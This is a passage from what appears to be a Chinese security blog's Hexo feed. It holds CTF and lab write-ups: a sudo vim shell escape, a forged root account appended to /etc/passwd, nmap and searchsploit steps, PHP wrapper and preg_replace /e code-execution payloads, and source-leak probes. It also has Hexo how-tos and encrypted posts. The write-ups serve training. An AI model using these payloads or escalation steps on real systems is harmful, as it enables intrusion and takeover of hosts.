xxx.xx.xx.xx</span><br></pre></td></tr></table></figure><p>爆破出来<code>passwd16</code>,登录ssh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh d3f4ult@xxxx xxx.xx.xx.xx -p xxxx</span><br></pre></td></tr></table></figure><h2 id="四、root-flag"><a href="#四、root-flag" class="headerlink" title="四、root_flag"></a>四、root_flag</h2><p>​查看当前用户可以使用root权限执行哪些命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/1717856843636.png" alt="1717856843636"></p><p>(1)vim提权</p><p>因为vim以root身份执行，使用vim启动的交互式shell也会同样具有root权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!/bin/bash[回车]</span><br></pre></td></tr></table></figure><p>成功提权。</p><p>(2)编辑&#x2F;etc&#x2F;passwd提权</p><p>root权限执行的vim可以对<code>/etc/passwd</code>进行写操作。而该文件中储存着当前系统中的所有用户及其密码，文件格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root: x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon: x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">用户名：密码：用户 ID：群组 ID：用户 ID 信息：用户的家目录： Shell</span><br></pre></td></tr></table></figure><p>​<code>/etc/passwd</code> 中的密码位为 x 是因为早期的 UNIX 密码放在 <code>/etc/passwd</code> 文件中，由于该文件允许所有用户读取，易导致用户密码泄露，因此从 <code>/etc/passwd</code> 文件中分离出来，并单独放到了此文件中。 <code>/etc/shadow</code> 文件只有 root 用户拥有读权限，保证了用户密码的安全性。但是我们可以向其中写入伪造的密码以达到效果：先使用 openssl 生成加密后的密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 123</span><br><span class="line">$1$h0N5PbHk$LKH90BH1KrLeGnwNSqQDq0</span><br></pre></td></tr></table></figure><p><img src="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/1717858297312.png" alt="1717858297312"></p><p>然后修改<code>/etc/passwd</code>root的信息，像下面这样。再追加到<code>etc/passwd</code>中，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Echo:$1$h0N5PbHk$LKH90BH1KrLeGnwNSqQDq0:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/passwd</span><br></pre></td></tr></table></figure><p>追加到<code>etc/passwd</code>中</p><p><img src="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/1717859234577.png" alt="1717859234577"></p><p>然后使用Echo:123登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su Echo</span><br><span class="line">enter passwd:123</span><br></pre></td></tr></table></figure><p>提权成功，然后进入&#x2F;root找到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br></pre></td></tr></table></figure><h2 id="五、一些拓展"><a href="#五、一些拓展" class="headerlink" title="五、一些拓展"></a>五、一些拓展</h2><p>（1）网站扫描</p><p>​常规情况下，我们需要使用Nmap等工具对目标网站进行扫描，以确认其开放的端口以及服务信息。我们需要对目标进行四次扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 1000 -p- -oA ports targetIP </span><br><span class="line"> #对目标以最低1000的速率进行全部端口扫描并保存结果到ports文件中</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p targetPorts -sT -sV -O -oA detail targetIP </span><br><span class="line">#对上一步得到的端口进行服务探测 sT:指定TCP扫描 sV:探测服务版本 O:探测目标操作系统 保存结果到detail文件中</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p targetPorts --script=vuln -oA vuln targetIp </span><br><span class="line">#对目标进行漏洞扫描，并将结果保存在vuln文件中</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 1000 -p- -sU -oA UDPScan targetIP</span><br><span class="line">#对目标进行UDP协议扫描，保存结果到UDPScan文件中 （不常用）</span><br></pre></td></tr></table></figure><p>在进行扫描后，根据得到的信息进行渗透优先级的判断。<strong>一般情况</strong>下，WEB服务的渗透优先级更高。</p><p>（2）漏洞搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit mara cms</span><br></pre></td></tr></table></figure><p><img src="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/1717861121447.png" alt="1717861121447"></p><p>根据搜索的path信息，使用命令将利用文件拷贝到当前目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 48780</span><br></pre></td></tr></table></figure><p>然后按照给出的poc执行。</p><p>（3）sudo提权</p><p>​<a href="https://blog.csdn.net/negnegil/article/details/120090266">https://blog.csdn.net/negnegil/article/details/120090266</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web爆破</title>
      <link href="/2024/06/07/web%E7%88%86%E7%A0%B4/"/>
      <url>/2024/06/07/web%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d67ca4e1bce3669f643202e1a908b0fc56422494b62eec0b842c9836600e6032"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看本文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo之文章加密</title>
      <link href="/2024/06/07/hexo%E4%B9%8B%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/06/07/hexo%E4%B9%8B%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>1.同样，进入根目录_config.yml配置文件，进行如下操作，没有就添加，有就修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt:</span><br><span class="line">enable: true</span><br></pre></td></tr></table></figure><p>2.找到你想要加密的文档，在文章信息头部添加信息，但是这里要注意，添加的时候冒号后面必须有一个空格才可以哦！！</p><p>举例如下：</p><p><img src="/2024/06/07/hexo%E4%B9%8B%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-07%20135655.png" alt="屏幕截图 2024-06-07 135655"></p><p>3.然后重新hexo执行后，再次访问就需要密码才能查看文章啦，快去试试吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo篇章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jr渗透测试仪</title>
      <link href="/2024/06/07/Jr%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%AA-1/"/>
      <url>/2024/06/07/Jr%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%AA-1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="31a1a6156ce7c231a470862e1c1e9a492c50b69252b20a707ead62420f052199">808f957c8f3dcb8d024b1b97590380807c93bee142cb37608bee1e8e13d2b15b97c8aa38fb675c23136ad36fdbfc4d1fa509fc97ccebad996aa08d3724d8e7696eba2610ab964a4ce1ebe8c7c2774b4c960959d0a7af77b288598625eedfd200f826b6d2e6520e7f42f44b2af26ac0738c3c3a905023f7b2bfecd3a4c58b0184a02531781c38d53e6e1ac75108dbab914a75699f6160a2204b8b2b24fc9028d280a2fcd7a44bcccdd50a5e0e9d03ec981608b9a5765ce1caedf31d941db279da991ed11c361c1e09dc83eb54c4f2b08db779cf151af55a1f73fb1445a8691eb6f0216efbf11d6ad6173997dd19992bbd46f81a0a173d19c050bbebfff11f76bdebe69bfd5df28a80945a80512ce837c7a52d9de659c3aa8ca29490652a3ae97aa030b6505b57664216e6f9f7f0cd31996b21fabf0622a76cb4af2d1186aab4a00a03a8a8d7ff8fdee41e55809c9ed89b0a6242300628ca58fbb9ec4645cf0647607fb83f935ef568d0fee37ab8f18358d66a3f90ed76fba09fd074f7e8e9411260caae90cdc10822db9d731e2937936d64b05be4335cb6da6800fe6976ed351977606178609c3b7e712acf1b3adee074f7e3ed671862ae919d6ca8b6b23ac202bb9c5392a8b137f96b389e41c0e7a6637cade50e8dffd55670d4ecb6f5b0960aa02a41c4d4d08cc9065f75bdabb9579bac0c81efc92947644b7f94e1d794494a339be504cbea96211d1090a45ed8885a686bf93739fafce6f5d36bde0660a1d3e29a23d7443ffcc731c2e6dbdeb0c893628c997247ed8598d9941abfbf512126631820c54cf9b666d0b1c81eb24d54d48ce52a543cd3253ec4582dee3d2ec4943eb8a17cdb5b68c50ab80635caa5927b24febed4e11ac6824913162886d54b74bf6e771fd7133656697470754f61e52845fc51ef2ab99189f7bbcb494a2c304d458e4946b6046f7d1f91f23b6e865bb89172dddd2a474fc5a48d41dca0c80fada52f70a278a2c380841515f8def5a86d5bbb9e7e0f57bda7410cc3dbff653cd07c5a5f3390db71d14f7257d517e3a0559d65e3605f93d2ed5aa76f762b9c7b1dcbfdfb55fe906aa506578b42291c5033640692882b3fb3e6d12a633499bb7068645028f63ec17011b7825245759faf4c835c9d4d443e0f038cc29d0f49f7d899acb972a568129c3920a966bcac51ddfe43cd01d51df6b742405a705bb1695d406a7e2f1b034c09d9b95c0c973eeacef24d386d3f124994a0c2434c1a8ea385a65178c30b5591785737a206c8ded9ccb2b39f62aa86a6574cfaef346a7dc649680bed64f3dad0abeba9682ed4fcb9bb981275fa8b22fb320715ebd6c082d4fb9354b02b2560fa7ea45b48469aac0e3ddea70585986d07a0bf3910b89d64c41ab602d3e0c5c74365aab20bbf3464dacbbf1f6e441f2dd5271621e614d34ac4789bf605d7a51c87be745c296ca72e10f854528a1aa6a1cacb8abd14fe4329bcc7f16af41bb4bdf7b79dae8650366f3b50fee7482fdef1e1be93add4c3e4deca1c42e5a919973b231d841955ed3fa581b33d7c86a2b67ce7c941275c29ab0b322e5de845391e9134c9921e905e3dcac41ee74be54bbedbf70fab37496ed69697907f1a002798d56927aa4ad9f8b8a2e2dc8ffe4b903726c3bcfa133e4baaa84411cb7aa44e0702028543d84dd3634606c86685691fb2aa3f8433d3d047c16d2e549ed4ec4c5f2671b962a57cd4825d1ec898f3ec4428cf9380421a15ff340edf03bf1a7dd04c9d488e1cea1754bacd48529cda1f23ea26a2e5091a5beacbea38852b1551d9259bbd5f632efec1528a34a94a5b5d2e0a3d4bfd8cfeb7a8f05d133c3f6620ed3c0b49bb3359198cd268d808edf87ddb082d38d5cdef3fa7636992328957881f0c8e41397ed6e581a38794225138398ddcd76a523d16995c3d1002376051693e03a5f466aa8dcea2d63891623c9d3c7a7caafdae014b2706ee30b45163b67ac2c2ceead3fa93156b5c2b7d030edcf56c479c2f31e504c5d6702e687404c99508709f398a66e6f35ef36f2dfe959a58a03479c19bead26396d3ccbf8884b63d45e68e63cfbcb002074bca82cd8c933a54984d5e515207cfe6bb0efc9ce4cbcb00508d4daa68d66ecd407c657120753ccfcd38721aa3399e69a7c55129a27b31d76e26f130b29a974791f6d75a812420eb78e2f587660194f2cbcdd8047a6479f7ff4b35a991d5d674c2a239b64dc4425ef14212987aa4202d807edd872dfe02625cdb02aa8cfb32bbc0403f2031b968dd247b3d8cdaf529f470f4bd3b03102a694586a809dad80d27bdd87d875664e47d27a4a925b8a337b43d9c6dd68f5e2ac19f1af32df7d0dd03822cdad5af91936df33366749f88ce27292357b65c038a3a250eec9ab1a40ab4b71c655c385ba3d5a1aa3b104ad0e8b3c5df411c6398b045ff1fe3709a4989086598ff1d7ef364a13f7633219391469f4887091b025a8c0340221f4e641263ef613918f634085a24d8668b8ebbf3be7c4d2417e8da0279246c479a89b67c00397326f31627ee4affc87815573de04cbd00e735dcfd0defef1cd3c91fd3ceb1b2465f5012eec74e784cfaf32f55be8a3d597aa789fd7e21056064bd754a1804a38dd0d8dabd5076f162f299483b074c889b8e3b9e67dda0132ccde0afcb391e3dca5c61b115d5f5c3896b9e981062cdf2920d8eac19deeb8057daa4ea9792b8951601df59df74bef6db1d361af07c7220943e2d8f9f7d05fcd26641ebe4be3a7a11dc59eddf408c54ddaa19995666af17fc09206c3897a37dec0e3e57d4b9f7e5dcadf67e3b875899fbd2cb3125eeb29f46a91f9be572d142c8755a006252e0a47c1bf8185de6113f440c28d954f55bd321f4cdda1c9f49e2b37446bf5b682f1a9255726488d3ba3e948cf7a03609dd8a7655c278793d885aa19091adca31b4c3f0be6e55951dbe9b806fad7ce8fd7223a2e98fdbfdf8206e8646be139bbf3dc6a4bacdbe784f5d8a90bc8506c9d8b158fc13775fba6ba9307b3401f6722edde5e5c7a7b062774e4722e2ac0417c5972dab89de600943c57aa5544bc372ef4ac8fc4ebfea0dd6a6de2bb6d7bc11f989a72271ed662aaef96b05ad2bfe0db6d568cbfb179961c09328c93126d0425802b7c3fcc1213ef57e8a816649ab81070cc92a8eec789ab9a8450ab47bfc3777cebd20dc42ae8bf9388fb30b5fce8dd4ad9c7b8e35665ed1641ae5b218ff92655b8c35a9f28d1c787a8c63f71e85012b2048fe512b9b8a3fc292e24830db8d2b99a3d5c4c658f19e55656c71d90206409d92361488fef275b5ebe7e758419ed1ae8dbb6a1f00e8354ad4a4db3425d506bfd7df0a8f9fad10429f534536c93e729adace3d636dae38d9e31282f955d5aa2dda447f85fd6fb08da7fc742f46e34344161781f7d97c0184f16681509ac1b55c4709c31774bab87c7ed6017d900e9e6e3d1fc1b7468d22402b66ccfec94aba0e9baa07c3f75ac0ad5d83a08911051939bb6ae705c6d0083947da6de52132902a28fb6e3d4f25f58a066289b8b002726f997c1aee9e10da6532e504ac17c6791ee6e5dbd4bb9bd0bd211a61d1cc04d0314fbf131957c21f94a772d0e706734f28dfa46eac8115c3cd37860943b3a1631b554b076e6d4994a26168e1bb72aa9e09a99d8cfa99cdeeb0d50cda53007ee0520c5fdbcd610eadc6460c42f2385c44cb1cc20763648e677e2a83b7989b8876dda1458b3a33c0c98c45dfd2da7525a23ea481f1f1e668b4b64750da8ed44e92e5f61b5929566fe939776888490c9a5224e2d80f68ea0d3c3abb862c05693f2f7dab9b7dcad63fd9ce47b97ae80916d3b1fae91d94f48dfdce402a14434e6e981165ddee75cf02082440149511691d08845448ed7ad4c1b07333808a61fd864e9d8056051b2948d13a7a02fdfce20db2487fad6a913c9ba1f88969eb91d0072fc0b2d77cb926c174369a78f7462fa64edba72012c0b108bbe177baa867523182ca4689d25bcec3d8ac1206f726bbea14464091312aa2a59cc51f662f91afe0b8cc924c18ef78f2af0ea7442f7dc545c0bd3ee88283618f85ff2c861945100ad58e12ab8aa75b0dc5a9ca87401a757da06b71d143be1e420206f65a869be786c47e9e00f59b2c29d7663120b59a8fb388fa859053f37eb0dc5a7edff5eddfd5ec6a0fbe4b9d5659d4eb8b37f3267ca8d284e3194c0685efaa8603d425eefa59b80f5cb4c8c2a29b71bba566bbf7680af3da55cd63f4a791a27615642c25b3b33b2ed43401bb68b28f0ca0208f19e4fa18ffad33246ec75350e7da189c140da2a921240641bbc83a33f67d35e3339e227a5a6ba6b3b3309ead1d52ade7aec1311c30973a0ffef8ba8cb9daeb60051f1eb2e09c1896d410a7db227de54a5826fa499334967e2394ca73b5ae015956875a95a2ed191859fa06e7e083521ff5f090e85347bece9669ac64ae26bbb7000e74a21316394297f1181c2f737e7544ef74729034adbf4de8b243b8559b32de0b6d521535406da609002c6c3af4a60a183e864b649622f9b1c526604f8a2177f6f1effca562faa435f9d64a71952e5b16c99e411851214bbf62905ca92b28ba95fb7ed942cbdc57b016282dd61b72cfc1399c318e06b046bd697a3601d5f8693bd76e0391b997d1f6ceac68a3cd3d62353e866649d95547f6cc677100c5e47dfa5505d62bd10bf25599e9b14b5ccc5bc1b8f0fd2758d334d5252f3114df1ed991f0fd8f4eb8c66486a5d949a2c581cc32f6481d11aac40e5c0871d973c533043a1a1e049dbb957c6888eb1442fda32ef333fc6a49e5041463e820ca8c2659577696cd8b61c3ad4ca12b3e2b14cdaa6e941cbb834e47e00df6c1b3bb9a1ae763076aae8167412fc1e0e8588ba4c154cd8a73c536da688d5e49d89d1fedab86390709414c8ad81bab10840ebe75108dd422a8148b28407f6c5715fe2da72d3b5b5dc744c6ed58c29cb1cb6be71c1a0c102bbef8529baca10e07da64d03ef36f62c75f00e4017991433d9230f75d0c33c9f270d1bf9c37c49b8f8b23bc7c43454fb047b99f462550b8d9131ff32566fa1e79b125e2a9dcdf81e279c62e7a2e2e3cd81019f128637cb8fb66fe977be9364f68fecab4e01f03bf5e56</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看本文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo之插入图片</title>
      <link href="/2024/06/07/hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
      <url>/2024/06/07/hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h2 id="hexo之插入图片"><a href="#hexo之插入图片" class="headerlink" title="hexo之插入图片"></a>hexo之插入图片</h2><p>​参考了网上许多文章，都解决不了问题，然后经过我照猫画虎的多次尝试(也就几个小时吧😅)，找到了一个还能凑合的方法(但是感觉很麻烦😅，以后会造成个问题，且就这样吧先，没办法，不然得被这个问题困一天，先用着吧)。具体如下：</p><p>1.根目录下的_config.yml配置文件里面的post_asset_folder设置为true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">即post_asset_folder: true</span><br></pre></td></tr></table></figure><p>2.上述完成后，利用hexo新建文档，如hexo new test，此时，它会自动在与test.md同目录下新建一个名字相同的文件即test文件，然后把你要显示的图片放在这个文件夹中。</p><p>3.打开Typora</p><p> 找到导航栏的文件–&gt;偏好设置–&gt;选择图像，然后像下面一样配置，它会在同目录下新建一个名为assets的文件夹，这样以后所有用到的图片都会被再次保存在这里面</p><img src="/2024/06/07/hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/a.png" alt="a" style="zoom: 33%;"><p>4.插入图片</p><p>如下，到插入本地图片这一步之后，一定要注意！！！一定是在第二步中的文件夹里面选择插入的图片，不然上传之后显示不出来(血的教训啊)。</p><img src="/2024/06/07/hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-07%20133143.png" alt="屏幕截图 2024-06-07 133143" style="zoom:50%;"><p>5.然后编辑，保存即可。</p><p>然后就可以上传查看是否显示成功啦。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s   静态查看</span><br><span class="line">hexo d </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> hexo篇章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题</title>
      <link href="/2024/06/01/buu%E5%88%B7%E9%A2%98/"/>
      <url>/2024/06/01/buu%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="BUU-CODE-REVIEW-1"><a href="#BUU-CODE-REVIEW-1" class="headerlink" title="BUU CODE REVIEW 1"></a>BUU CODE REVIEW 1</h2><p>​    这道题直接用md5数组绕过以及反序列化，反序列化这里直接把$correct的值赋给$unput即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class BUU &#123;</span><br><span class="line">   public $correct = &quot;&quot;;</span><br><span class="line">   public $input = &quot;&quot;;</span><br><span class="line">   public function __destruct() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           $this-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           if($this-&gt;correct === $this-&gt;input) &#123;</span><br><span class="line">               echo file_get_contents(&quot;/flag&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception $e) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new BUU();</span><br><span class="line">$a-&gt;input=&amp;$a-&gt;correct;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>​这道题分两步：<br>第一步：绕过file_get_contents()     伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.绕过file_get_contents()两种方法</span><br><span class="line">(1)$text=data://text/plain,I have a dream   或者text=data://text//plain;base64,SSBoYXZlIGEgZHJlYW0=</span><br><span class="line">(2)$text=php://inut</span><br><span class="line">然后post发送I have a dream</span><br><span class="line">2.伪协议</span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=next.php</span><br><span class="line">base64解码得到源码</span><br></pre></td></tr></table></figure><p>第二步 preg_replace   命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">return preg_replace(</span><br><span class="line">&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">&#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">$str</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><p>知识：preg_replace(要搜索的字符串，要替换的字符串，原始字符串)第一个参数以&#x2F;e结尾时，会存在命令执行漏洞，即如果有&#x2F;e，且匹配到了符合正则的字符串,第二个参数将被执行，而这里的strtolower(“\1”)即strtolower(“\1”),\1有自己的意思，即取出正则表达式匹配后子匹配表达式的第一项，就是取出匹配到的{${phpinfo()}},再转化为字符串，即”{${phpinfo()}}”,然后执行。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vip限免</title>
      <link href="/2024/05/31/vip%E9%99%90%E5%85%8D/"/>
      <url>/2024/05/31/vip%E9%99%90%E5%85%8D/</url>
      
        <content type="html"><![CDATA[<p>1.源码泄露</p><p>查看源码即可</p><p>2.前台JS绕过</p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js前台拦截 === 无效操作</span><br></pre></td></tr></table></figure><p>我的回答：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3种方法：</span><br><span class="line">1.浏览器禁用js后刷新即可     </span><br><span class="line">地址栏输入：about:config</span><br><span class="line">    找到 javascript.enabled 将其转换为false</span><br><span class="line">2.Ctrl+U查看源代码</span><br><span class="line">3.开发者工具</span><br></pre></td></tr></table></figure><p>3.协议头信息泄露</p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没思路的时候抓个包看看，可能会有意外收获</span><br></pre></td></tr></table></figure><p>我的回答:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">抓包，或者在firefox在网络那一栏的消息头里面可以看到</span><br></pre></td></tr></table></figure><p>4.robots后台泄露            </p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">总有人把后台地址写入robots，帮黑阔大佬们引路。</span><br></pre></td></tr></table></figure><p>我的回答：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url后加上robots.txt后，得到信息，在重新访问/flagishere.txt</span><br></pre></td></tr></table></figure><p>漏洞原理及危害： 网站根目录下存在robots.txt文件，其内容规定了网络爬虫可爬和不可爬的目录文件。 搜索引擎可以通过robots文件可以获知哪些页面可以爬取，哪些页面不可以爬取。robots.txt文件可能会泄露网站的敏感目录或者文件，比如网站后台路径，从而得知其使用的系统类型，从而有针对性地进行利用。</p><p>5.phps源码泄露            </p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phps源码泄露有时候能帮上忙</span><br></pre></td></tr></table></figure><p>访问index.phps，打开即可</p><p>6.源码压缩包泄露</p><p>url+<a href="http://www.zip,之后再访问url+fl000g.txt,得到flag/">www.zip，之后再访问url+fl000g.txt,得到flag</a></p><p>7.版本控制泄露源码            </p><p>.git泄露，url+.git</p><p>8.版本控制泄露源码2            </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目:版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure><p>.svn泄露，url+.svn</p><p>9.vim临时文件泄露            </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述:    </span><br><span class="line">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</span><br></pre></td></tr></table></figure><p>访问&#x2F;index.php.swp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原理:</span><br><span class="line">vim临时文件泄露 